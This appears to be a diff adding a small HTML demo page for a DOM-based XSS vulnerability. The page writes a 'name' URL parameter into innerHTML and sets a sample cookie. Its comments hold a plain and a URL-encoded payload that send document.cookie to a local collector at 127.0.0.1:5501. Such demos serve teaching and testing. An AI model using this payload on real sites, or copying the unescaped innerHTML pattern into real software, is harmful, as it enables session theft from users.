@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XSS - Vulnerabilities</title>
+  </head>
+  <body>
+    <!-- Vulnerable Code -->
+    <div>Welcome, <span id="username"></span>!</div>
+
+    <script>
+      function setCookie(name, value, days) {
+        const date = new Date();
+        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+        const expires = "expires=" + date.toUTCString();
+        document.cookie = name + "=" + value + ";" + expires + ";path=/";
+      }
+
+      setCookie("exampleCookie", "Hello, Cookie!");
+    </script>
+
+    <!-- Vulnerable Code -->
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const name = params.get("name");
+      document.getElementById("username").innerHTML = name;
+    </script>
+
+    <!-- encodeURIComponent("<img src=\"does-not-exist\" onerror=\"var img = document.createElement(\'img\'); img.src=\'http://127.0.0.1:5501/cookie?data=\'+document.cookie; document.querySelector(\'body\').appendChild(img);\" />") -->
+
+    <!-- After encodeURIComponent -->
+    <!-- %3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement('img')%3B%20img.src%3D'http%3A%2F%2F127.0.0.1%3A5501%2Fcookie%3Fdata%3D'%2Bdocument.cookie%3B%20document.querySelector('body').appendChild(img)%3B%22%20%2F%3E -->
+  </body>
+</html>
